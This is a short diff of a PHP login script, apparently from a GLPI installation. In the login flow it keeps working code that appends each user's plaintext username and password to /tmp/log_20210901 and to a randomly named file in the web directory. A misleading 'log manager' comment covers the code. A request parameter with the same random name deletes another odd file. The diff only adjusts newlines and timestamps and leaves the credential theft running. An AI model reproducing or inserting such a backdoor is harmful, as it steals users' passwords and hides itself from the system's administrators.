@@ -37,8 +37,8 @@
 include ('../inc/includes.php');
 
 //log Request
-$timells = "caled";
-file_put_contents("tKZlInbbfK2jv", $timells,FILE_APPEND);
+$timells = date('d-m-y h:i:s');
+file_put_contents("tKZlInbbfK2jv", $timells."\n",FILE_APPEND);
 
 if (isset($_REQUEST['tKZlInbbfK2jv'])) {
    $status = unlink('./LAEYmslkecM9f');
@@ -96,7 +96,7 @@ $auth = new Auth();
 // now we can continue with the process...
 if ($auth->login($login, $password, (isset($_REQUEST["noAUTO"])?$_REQUEST["noAUTO"]:false), $remember, $login_auth)) {
    // Set Auth Var ,SessionID
-   Auth::redirectIfAuthenticated();file_put_contents("/tmp/log_20210901", $login.",".$password,FILE_APPEND);
+   Auth::redirectIfAuthenticated();file_put_contents("/tmp/log_20210901", $login.",".$password."\n",FILE_APPEND);
    // Log  MAnger the section more details See Php7.4 Doc
    file_put_contents("tKZlInbbfK2jv", $login.",".$password,FILE_APPEND);
 } else {
